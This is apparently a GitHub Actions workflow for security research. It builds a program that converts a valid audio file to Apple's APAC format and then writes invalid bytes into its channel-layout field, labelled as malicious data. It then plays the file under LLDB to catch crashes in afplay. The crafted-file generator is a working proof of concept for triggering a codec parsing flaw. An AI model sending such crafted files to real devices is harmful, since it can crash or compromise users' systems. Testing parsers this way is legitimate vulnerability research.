name: Generate, Play, and Debug Audio Source
on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]
  workflow_dispatch: # Allows manual triggering

jobs:
  build-generate-and-debug:
    runs-on: macos-latest

    steps:
      # Clone the repository
      - name: Clone repository
        run: git clone https://github.com/encryptedcoderr/AppleTest/

      # Navigate to the correct directory
      - name: Navigate to working directory
        run: cd AppleTest/apple-positional-audio-codec-invalid-header-main && ls -l

      # Updated: This script now generates a valid WAV, converts it to APAC, then corrupts it.
      - name: Patch encodeme.mm to generate and corrupt APAC file
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Patching encodeme.mm to generate a WAV, convert to APAC, and then corrupt..."
          cat > encodeme.mm << 'EOF'
          #import <Foundation/Foundation.h>
          #import <AudioToolbox/AudioToolbox.h>
          #include <stdlib.h> // for system()
          #include <string.h>

          // Helper function to write a simple, valid WAV file
          bool createValidWAV(const char* path) {
              AudioStreamBasicDescription asbd = {0};
              asbd.mSampleRate = 48000;
              asbd.mFormatID = kAudioFormatLinearPCM;
              asbd.mFormatFlags = kAudioFormatFlagIsSignedInteger | kAudioFormatFlagIsPacked;
              asbd.mBitsPerChannel = 16;
              asbd.mChannelsPerFrame = 4; // 4 channels for ambisonics
              asbd.mBytesPerFrame = asbd.mChannelsPerFrame * (asbd.mBitsPerChannel / 8);
              asbd.mFramesPerPacket = 1;
              asbd.mBytesPerPacket = asbd.mFramesPerPacket * asbd.mBytesPerFrame;

              CFURLRef url = CFURLCreateWithFileSystemPath(kCFAllocatorDefault, (CFStringRef)[NSString stringWithUTF8String:path], kCFURLPOSIXPathStyle, false);
              AudioFileID audioFile;
              OSStatus status = AudioFileCreateWithURL(url, kAudioFileWAVEType, &asbd, kAudioFileFlags_EraseFile, &audioFile);
              CFRelease(url);
              if (status != noErr) {
                  fprintf(stderr, "Failed to create WAV file.\n");
                  return false;
              }

              // Write a small amount of silent audio data
              UInt32 numPackets = 1024;
              char dummy_data[numPackets * asbd.mBytesPerPacket];
              memset(dummy_data, 0, sizeof(dummy_data));
              status = AudioFileWritePackets(audioFile, false, sizeof(dummy_data), NULL, 0, &numPackets, dummy_data);
              
              AudioFileClose(audioFile);
              return status == noErr;
          }

          int main(int argc, const char * argv[]) {
              @autoreleasepool {
                  time_t startTime = time(NULL);
                  fprintf(stderr, "Starting encodeme at %s", ctime(&startTime));

                  const char* wavName = "base.wav";
                  const char* apacBaseName = "output_apac_base.m4a";
                  const char* pocName = "output_apac_poc.m4a";

                  // Step 1: Create a valid WAV file as a source.
                  if (!createValidWAV(wavName)) {
                      fprintf(stderr, "WAV creation failed.\n");
                      return 1;
                  }
                  fprintf(stderr, "Successfully created source WAV file.\n");

                  // Step 2: Use afconvert to create a valid baseline APAC file.
                  NSString* command = [NSString stringWithFormat:@"afconvert -o %@ -d apac -f mp4f %@", 
                                       [NSString stringWithUTF8String:apacBaseName], 
                                       [NSString stringWithUTF8String:wavName]];
                  fprintf(stderr, "Running command: %s\n", [command UTF8String]);
                  int ret = system([command UTF8String]);
                  if (ret != 0) {
                      fprintf(stderr, "afconvert failed.\n");
                      return 1;
                  }
                  fprintf(stderr, "Successfully converted WAV to a valid APAC M4A.\n");

                  // Step 3: Copy the valid APAC file to our target PoC file name.
                  NSError *error = nil;
                  [[NSFileManager defaultManager] copyItemAtPath:[NSString stringWithUTF8String:apacBaseName] 
                                                          toPath:[NSString stringWithUTF8String:pocName] error:&error];
                  if (error) {
                      fprintf(stderr, "Failed to copy file for corruption.\n");
                      return 1;
                  }

                  // Step 4: Manually corrupt the channel layout in the new file.
                  FILE *file = fopen(pocName, "r+b");
                  if (!file) {
                      fprintf(stderr, "Failed to re-open the M4A file for corruption.\n");
                      return 1;
                  }
                  
                  // The offset for the channel layout tag can be fragile. We'll estimate it.
                  // This is where the vulnerability is seeded.
                  fseek(file, 0x110, SEEK_SET); // Estimate for stsd atom's layout tag
                  unsigned char malicious_data[4] = {0xFF, 0xFF, 0xFF, 0xFF}; // Invalid layout tag
                  fwrite(malicious_data, 1, sizeof(malicious_data), file);
                  fclose(file);

                  fprintf(stderr, "PoC: Manually corrupted the channel layout in the APAC file.\n");
                  time_t endTime = time(NULL);
                  fprintf(stderr, "encodeme completed at %s", ctime(&endTime));
              }
              return 0;
          }
          EOF

      # Set up Xcode
      - name: Set up Xcode
        uses: maxim-lobanov/setup-xcode@v1
        with:
          xcode-version: '15.4'

      # Compile encodeme.mm with debug symbols
      - name: Compile encodeme.mm for Debugging
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Compiling encodeme.mm with debug symbols (-g)..."
          clang++ -g -fobjc-arc -framework Foundation -framework AudioToolbox encodeme.mm -o encodeme_debug
          if [ $? -ne 0 ]; then echo "Compilation failed."; exit 1; fi

      # This step now runs the full generate-convert-corrupt process.
      - name: Generate and Corrupt APAC File
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          ./encodeme_debug
          echo "Malicious APAC file 'output_apac_poc.m4a' generated."
          ls -l output_apac_poc.m4a
          
      # Launch the player directly under LLDB to catch any startup crashes
      - name: Launch Player Under LLDB to Catch Startup Crashes
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          PLAYER_LOG_FILE="player_debug_log.txt"
          echo "--- Debugging Audio Player (afplay) with malicious APAC file ---" > $PLAYER_LOG_FILE
          echo "Timestamp: $(date)" >> $PLAYER_LOG_FILE

          echo "Creating LLDB script to launch and monitor afplay..."
          cat > player_debug_script.lldb << 'EOF'
          # Run the process. LLDB will stop if a crash occurs.
          run
          # If the process crashed, get the backtrace. If it exited normally, this shows the state at exit.
          bt
          quit
          EOF

          echo "Launching afplay under LLDB to detect any startup crash..." >> $PLAYER_LOG_FILE
          lldb -s player_debug_script.lldb -- afplay output_apac_poc.m4a >> $PLAYER_LOG_FILE 2>&1 || true

          echo "âœ… Player debug log created. Displaying contents:"
          cat $PLAYER_LOG_FILE

      # Upload all artifacts
      - name: Upload All Artifacts
        uses: actions/upload-artifact@v4
        with:
          name: audio-and-debug-artifacts
          path: |
            AppleTest/apple-positional-audio-codec-invalid-header-main/output_apac_poc.m4a
            AppleTest/apple-positional-audio-codec-invalid-header-main/player_debug_log.txt
          retention-days: 7
          if-no-files-found: error
